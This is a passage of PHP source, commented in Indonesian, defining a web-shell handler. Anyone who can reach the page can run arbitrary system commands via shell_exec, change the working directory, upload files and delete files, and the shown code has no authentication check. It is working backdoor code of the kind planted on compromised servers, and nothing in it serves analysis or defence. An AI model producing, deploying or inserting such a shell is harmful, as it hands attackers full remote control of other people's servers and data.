// 4. FUNGSI HANDLER SHELL
// ============================================================
function handleShell() {
    // Ambil current working directory
    $cwd = isset($_POST['cwd']) ? $_POST['cwd'] : (isset($_GET['cwd']) ? $_GET['cwd'] : getcwd());
    if (!is_dir($cwd)) $cwd = getcwd();
    chdir($cwd);

    // ---- Handle command execution ----
    if (isset($_POST['cmd'])) {
        $output = shell_exec($_POST['cmd'] . ' 2>&1');
        echo "<pre style='color:#0f0;background:#000;padding:10px;'>" . htmlspecialchars($output) . "</pre>";
        exit;
    }

    // ---- Handle file upload ----
    if (isset($_FILES['file'])) {
        $target = $cwd . '/' . basename($_FILES['file']['name']);
        move_uploaded_file($_FILES['file']['tmp_name'], $target);
        echo "Uploaded!";
        exit;
    }

    // ---- Handle file delete ----
    if (isset($_GET['delete'])) {
        @unlink($cwd . '/' . $_GET['delete']);
        echo "Deleted!";
        exit;
    }

    // ---- Tampilkan shell UI ----
    renderShellUI($cwd);
}

